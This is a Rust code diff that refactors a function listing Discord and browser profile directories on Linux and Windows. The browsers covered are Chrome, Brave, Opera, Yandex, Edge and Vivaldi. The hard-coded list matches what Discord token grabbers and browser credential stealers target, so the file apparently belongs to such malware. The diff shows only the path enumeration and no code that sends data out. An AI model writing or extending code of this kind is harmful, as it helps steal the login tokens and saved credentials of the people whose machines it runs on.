@@ -14,20 +14,20 @@ fn paths() -> Vec<String> {
 fn paths() -> Vec<String> {
     let config_path = dirs::config_dir().unwrap().display().to_string();
 
-    let mut paths = vec![];
-
-    paths.push(format!("{}/discord", config_path)); // Discord
-    paths.push(format!("{}/discordcanary", config_path)); // Discord Canary
-    paths.push(format!("{}/discordptb", config_path)); // Discord PTB
-    paths.push(format!("{}/google-chrome/Default", config_path)); // Google Chrome
-    paths.push(format!("{}/google-chrome-beta/Default", config_path)); // Google Chrome Beta
-    paths.push(format!("{}/google-chrome-unstable/Default", config_path)); // Google Chrome Dev
-    paths.push(format!("{}/chromium/Default", config_path)); // Chromium
-    paths.push(format!("{}/vivaldi/Default", config_path)); // Vivaldi
-    paths.push(format!("{}/BraveSoftware", config_path)); // Brave
-    paths.push(format!("{}/opera", config_path)); // Opera
-    paths.push(format!("{}/yandex-browser", config_path)); // Yandex
-    paths.push(format!("{}/yandex-browser-beta", config_path)); // Yandex Beta
+    let paths = vec![
+        format!("{}/discord", config_path), // Discord
+        format!("{}/discordcanary", config_path), // Discord Canary
+        format!("{}/discordptb", config_path), // Discord PTB
+        format!("{}/google-chrome/Default", config_path), // Google Chrome
+        format!("{}/google-chrome-beta/Default", config_path), // Google Chrome Beta
+        format!("{}/google-chrome-unstable/Default", config_path), // Google Chrome Dev
+        format!("{}/chromium/Default", config_path), // Chromium
+        format!("{}/vivaldi/Default", config_path), // Vivaldi
+        format!("{}/BraveSoftware", config_path), // Brave
+        format!("{}/opera", config_path), // Opera
+        format!("{}/yandex-browser", config_path), // Yandex
+        format!("{}/yandex-browser-beta", config_path), // Yandex Beta        
+    ];
 
     paths
         .iter()
@@ -39,26 +39,21 @@ fn paths() -> Vec<String> {
 fn paths() -> Vec<String> {
     let roaming = dirs::config_dir().unwrap().display().to_string();
     let local = dirs::cache_dir().unwrap().display().to_string();
-    let mut paths = vec![];
-
-    paths.push(format!("{}\\discord", roaming)); // Discord
-    paths.push(format!("{}\\discordcanary", roaming)); // Discord Canary
-    paths.push(format!("{}\\discordptb", roaming)); // Discord PTB
-    paths.push(format!("{}\\Opera Software\\Opera Stable'", roaming)); // Opera
-    paths.push(format!("{}\\Google\\Chrome\\User Data\\Default", local)); // Google Chrome
-    paths.push(format!("{}\\Google\\Chrome Beta\\User Data\\Default", local)); // Google Chrome Beta
-    paths.push(format!("{}\\Google\\Chrome SxS\\User Data\\Default", local)); // Google Chrome Canary
-    paths.push(format!("{}\\Chromium\\User Data\\Default", local)); // Chromium
-    paths.push(format!(
-        "{}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-        local
-    )); // Brave
-    paths.push(format!(
-        "{}\\Yandex\\YandexBrowser\\User Data\\Default",
-        local
-    )); // Yandex
-    paths.push(format!("{}\\Microsoft\\Edge\\User Data\\Default", local)); // Edge
-    paths.push(format!("{}\\Vivaldi\\User Data\\Default", local)); // Vivaldi
+    
+    let paths = vec![
+        format!("{}\\discord", roaming), // Discord
+        format!("{}\\discordcanary", roaming), // Discord Canary
+        format!("{}\\discordptb", roaming), // Discord PTB
+        format!("{}\\Opera Software\\Opera Stable'", roaming), // Opera
+        format!("{}\\Google\\Chrome\\User Data\\Default", local), // Google Chrome
+        format!("{}\\Google\\Chrome Beta\\User Data\\Default", local), // Google Chrome Beta
+        format!("{}\\Google\\Chrome SxS\\User Data\\Default", local), // Google Chrome Canary
+        format!("{}\\Chromium\\User Data\\Default", local), // Chromium
+        format!("{}\\BraveSoftware\\Brave-Browser\\User Data\\Default", local), // Brave
+        format!("{}\\Yandex\\YandexBrowser\\User Data\\Default", local), // Yandex
+        format!("{}\\Microsoft\\Edge\\User Data\\Default", local), // Edge
+        format!("{}\\Vivaldi\\User Data\\Default", local), // Vivaldi
+    ];
 
     paths
         .iter()
